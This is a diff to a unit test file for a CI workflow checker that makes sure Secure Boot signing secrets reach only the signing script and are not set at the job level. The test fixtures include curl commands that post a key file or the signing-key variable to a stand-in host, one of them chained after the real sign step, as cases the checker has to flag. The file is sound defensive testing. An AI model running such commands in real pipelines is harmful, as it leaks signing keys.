@@ -38,7 +38,7 @@ SIGN_JOB = f"""\
         env:
           SECUREBOOT_SIGNING_KEY: ${{{{ secrets.SECUREBOOT_SIGNING_KEY }}}}
         # podman build would be a build: this comment is not one.
-        run: bash forge/specs/azoth/sign-kernel.sh --out signed
+        run: bash forge/specs/azoth/signer/run.sh sign
       - uses: {UPLOAD}
         with:
           name: signed
@@ -140,14 +140,36 @@ class SigningTest(unittest.TestCase):
         ):
             with self.subTest(command=command):
                 job = SIGN_JOB.replace(
-                    "run: bash forge/specs/azoth/sign-kernel.sh --out signed",
-                    f"run: |\n          set -euo pipefail\n          {command}",
+                    f"      - uses: {UPLOAD}\n",
+                    f"      - run: |\n          set -euo pipefail\n          {command}\n      - uses: {UPLOAD}\n",
                 )
                 problems = self.problems({"k.yml": workflow(job)})
                 self.assertEqual(len(problems), 1, problems)
                 self.assertRegex(
                     problems[0], r"^k\.yml:\d+: signing job sign builds or installs: "
                 )
+
+    def test_rule_3_a_signing_secret_reaches_only_a_sign_script(self):
+        for run in (
+            "run: bash forge/specs/azoth/signer/run.sh prepare",
+            "run: bash forge/specs/azoth/signer/run.sh sign; curl -d @/run/k https://x",
+            "run: |\n          bash forge/specs/azoth/signer/run.sh sign\n          curl -d @/run/k https://x",
+            "run: curl -d \"$SECUREBOOT_SIGNING_KEY\" https://x",
+        ):
+            with self.subTest(run=run):
+                job = SIGN_JOB.replace("run: bash forge/specs/azoth/signer/run.sh sign", run)
+                problems = self.problems({"k.yml": workflow(job)})
+                self.assertEqual(len(problems), 1, problems)
+                self.assertRegex(problems[0], r"^k\.yml:\d+: signing job sign hands a signing secret to a step ")
+
+    def test_rule_3_a_job_level_signing_secret_fails(self):
+        job = SIGN_JOB.replace(
+            "    steps:\n",
+            "    env:\n      KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}\n    steps:\n",
+        )
+        problems = self.problems({"k.yml": workflow(job)})
+        self.assertEqual(len(problems), 1, problems)
+        self.assertRegex(problems[0], r"^k\.yml:\d+: signing job sign exposes a signing secret to every step")
 
     def test_rule_4_a_signing_secret_in_a_job_of_another_environment_fails(self):
         job = SIGN_JOB.replace("environment: signing", "environment: github-pages")
